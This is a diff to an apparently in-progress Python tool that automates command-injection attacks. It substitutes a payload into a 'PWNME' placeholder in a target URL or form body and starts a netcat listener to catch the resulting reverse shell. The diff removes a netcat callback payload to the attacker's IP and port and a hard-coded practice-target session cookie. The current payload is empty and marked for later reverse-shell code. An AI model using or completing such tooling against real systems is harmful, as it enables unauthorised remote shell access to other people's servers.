@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 #coding=utf-8
+import sys
+import signal
 import netifaces
 import base64
-import requests
 import os
 import argparse
 import nclib
@@ -10,6 +11,7 @@ from threading import Thread
 import ipaddress
 import urllib3
 import json
+import requests
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -27,9 +29,9 @@ banner = '''
 print(banner)
 
 def main():
-	global args , default_ip , nc , port , ip , domain , method ,data , authentication 
+	global args , default_ip , nc , port , ip , domain , method ,data , authentication , signal
 	ip_address = netifaces.ifaddresses('lo')[2][0]['addr']
-	################################# Arguments Crreation ###########################################
+	################################# Arguments Creation ###########################################
 	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 	parser.add_argument('-H','--host',help='LOCAL IP ADDRESS',default=ip_address)
 	parser.add_argument('-p','--port',help='LOCAL PORT NUMBER',type=int,default=9001)
@@ -38,10 +40,10 @@ def main():
 	parser.add_argument("-d","--data",help='Post data')
 	parser.add_argument("-c","--cookie",help='Enter Cookie')
 	parser.add_argument("-k","--header",help='Provide header')
-	parser.add_argument("-m","--method",help='Request Method',default='post')
+	parser.add_argument("-m","--method",help='Request Method',default='POST')
 	parser.add_argument("-a","--auth",help='[USERNAME PASSWORD]', nargs=2)
 	args = parser.parse_args()
-	##################################################################################################
+	########################################################################
 	########################## Defining variables ##########################
 	ip=ip_address
 	ip=args.host
@@ -58,39 +60,48 @@ def main():
 		shell_windows()
 	else:
 		print("[!]Invalid Value -> "+ args.type)
+		exit_gracefully()
 	######################################################################
 
-def shell_linux():
-	print("listening on port: "+ f"{port}" + "\n" + "Default ip for payloads: "+ f"{ip}")
-	print ("---> Waiting For a connection ")
-	print(authentication[0])
-	login()
-	#thread()
-	#is_valid()
-	#send_payload()
-	#listener()
+def info():
+	print('[+]LOCAL IP ADDRESS : %s'%ip)
+	print('[+]LOCAL PORT : %s'%port)
+	print('[+]TARGET URL : %s'%domain)
+	if authentication:
+		print('[+]USERNAME : %s'%authentication[0])
+		print('[+]PASSWORD : %s'%authentication[1])
+	print('\n#Waiting for a Connection ....')
 
 
-def is_valid():
-    try:
-        ipaddress.ip_address(ip)
-        return True
-    except ValueError:
-        return False
-        # ADD a better except to break the program
+def shell_linux():  #Default option
+	info()
+	#login()
+	is_valid()
+	thread() #leave it the last one
 
-def listener():
+
+def is_valid():  #Checking if the ip address is valid
+	try:
+		ipaddress.ip_address(ip)
+		return True
+	except ValueError:
+		print("\n[!]Invalid IP : "+ip)
+		exit_gracefully()
+
+def listener(): #setting up the nc listener
 	nc = nclib.Netcat(listen=('', port))
 	nc.interact()
 	nc.close()
 
 def thread():
-	t1=Thread(target=listener)
-	t2=Thread(target=send_payload)
-	t1.start()
-	t2.start()
-	t1.join()
-	t2.join()
+	t_listen=Thread(target=listener)
+	t_send=Thread(target=send_payload)
+	t_listen.daemon=True
+	t_send.daemon=True
+	t_listen.start()
+	t_send.start()
+	t_listen.join()
+	t_send.join()
 
 def send_payload():
 	if method == 'post':
@@ -102,14 +113,13 @@ def send_payload():
 		return False
 
 def req_post():
-	payload=f'''echo "hello" | nc {ip} {port}'''
-	url = domain.replace('PWNME',payload) #payload will be the revshells
+	payload=''
+	url = domain.replace('PWNME',payload) #payoad will be the revshells
 	proxies={'http':'http://127.0.0.1:8080'}
 	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'} #Don't Change*
-	cookies={'PHPSESSID':'57gcuqnl9bjalet0s7af55lir0', 'security':'low'}
-	data_parsed=data.replace("PWNME",payload) #Don't change
-	print(data_parsed)
-	r=requests.post(url,headers=headers,data=data_parsed,cookies=cookies,proxies=proxies)
+	cookies=''
+	#data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
+	r=requests.post(url,headers=headers)
 
 def req_get():
 	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
@@ -119,13 +129,15 @@ def req_get():
 def login():
 	pass
 
-
-
-def exit():
-	pass
+def exit_gracefully():
+	print("                                   #GOOD BYE!")
+	exit()
 
 if __name__ == '__main__':
+	try:
 		main()
+	except KeyboardInterrupt:
+		exit_gracefully()
 
 
 #TODO
@@ -134,4 +146,3 @@ if __name__ == '__main__':
 #Add login form with a session
 #Add customization for cookies & Headers
 #Add the payload generator
-#Add an exit message to break instead of errors
